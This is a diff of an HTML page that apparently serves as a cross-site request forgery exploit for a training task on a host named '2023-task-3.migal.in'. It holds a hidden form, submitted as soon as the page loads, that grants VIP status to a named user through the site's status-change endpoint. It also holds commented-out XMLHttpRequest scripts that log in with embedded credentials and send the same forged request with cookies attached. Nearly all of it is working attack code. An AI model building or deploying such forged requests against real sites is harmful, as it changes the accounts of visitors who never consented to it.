@@ -1,20 +1,27 @@
 <html>
-<head><title>Main page</title>
-</head>
-<body>
-
-
-<form name="f1" id="f1" method="POST" action="https://2023-task-3.migal.in/api/user/status/change/">
-            <input name="username" id="username_field" value="Sterben37400" type="text">
-            <input name="is_vip" id="status_field" type="checkbox" value="True" checked="checked">
-
+    <!--<script>
+        var request = new XMLHttpRequest();
+        var data = 'username=Sterben37400&password=Sterben37400';
+        request.open('POST','https://2023-task-3.migal.in/login',true);
+        request.withCredentials=true;
+        request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request.send(data);
+    </script>
+    <script>
+        var request = new XMLHttpRequest();
+        var data = 'username=Sterben37400&is_vip=True';
+        request.open('POST','https://2023-task-3.migal.in/api/user/status/change/',true);
+        request.withCredentials=true;
+        request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request.send(data);
+    </script>-->
+        <form method="POST" name = 'vip' action="https://2023-task-3.migal.in/api/user/status/change/" hidden>
+            <label for="username_field">Имя пользователя</label>
+            <input name="username" id="username_field" value="max37400" type="text" disabled="">
+            <label for="status_field"> vip cтатус</label>
+            <input name="is_vip" id="status_field" type="checkbox" value="True" disabled="">
         </form>
-
-</body>
-
-<script>
-window.onload = function(){
-  document.forms['f1'].submit();
-}
-</script>
+        <script>
+            document.forms['vip'].submit();
+        </script>
 </html>
